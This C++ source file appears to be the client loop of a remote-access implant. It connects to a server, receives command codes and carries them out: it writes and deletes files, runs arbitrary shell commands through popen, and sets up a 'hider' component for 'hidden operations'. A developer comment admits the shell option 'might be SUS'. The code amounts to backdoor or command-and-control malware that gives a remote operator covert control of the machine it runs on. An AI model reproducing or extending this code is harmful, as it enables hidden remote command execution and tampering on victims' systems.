#include <iostream>

#include "Status.h"
#include "client.h"
#include "SoftwareManeger.h"
#include "FunCodes.h"
#include "HiderManeger.h"
#include "HiderCodes.h"

void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger);
void testSoftwareManeger(void);

int main() {
    
    Client client;
    client.createSocket();
    std::cout << "Created Socket\n";
    client.connectServer();
    std::cout << "Connected to server\n";
    SoftwareManeger swm = SoftwareManeger();
    HiderManeger hiderManager = HiderManeger();

    bool cont = true;
    while (cont)
    {
        loopIter(client, swm, hiderManager);
        cont = false;
    }

    return EXIT_SUCCESS;
}
// & outdated
// void testSoftwareManeger() {
//     SoftwareManeger swm = SoftwareManeger();
//     swm.fileWrite("tempSwmTest.txt", false, "this is my first test\n");
//     swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
    
//     swm.deleteFile("tempSwmTest.txt");

// }



std::string execBash(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }

    pclose(pipe);
    return result;
}


void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
{
    // receive command
    Message msg;
    Status res = SUCCSESS;
    std::cout << "Trying to receive command\n";
    client.recvCommand(msg);
    std::cout << "Command received\n";
    uint fncode = msg.fnccode();
    std::string param = msg.param1();

    std::cout << "Server: fncode-" << fncode << " param-" << param << std::endl;
    std::string response = "";
    switch (fncode)
    {
    case WRITE_FILE:
        swm.fileWrite(client, param);
        break;

    case DELETE_FILE:
        res = swm.deleteFile(param);
        break;

    case RUN_BASH:
        response = execBash(param.c_str()); // maybe we shoud abandon this option, it might be SUS
        break;

    case HIDER_SETUP:
        hiderManeger.setUpHider(param);
        break;
    }
    // hidden handling
    if (fncode & HIDDEN_OPRATION) {
        res = hiderManeger.hiddenAction(fncode, param, client);
    }
    
    // TODO change such that there will be response only if we want it to be 
    Message msgres;
    msgres.set_fnccode(res);
    msgres.set_param1(response);
    std::cout << "Client: res-" << res << " response-\n" << response << std::endl;
    client.sendCommand(msgres);
}
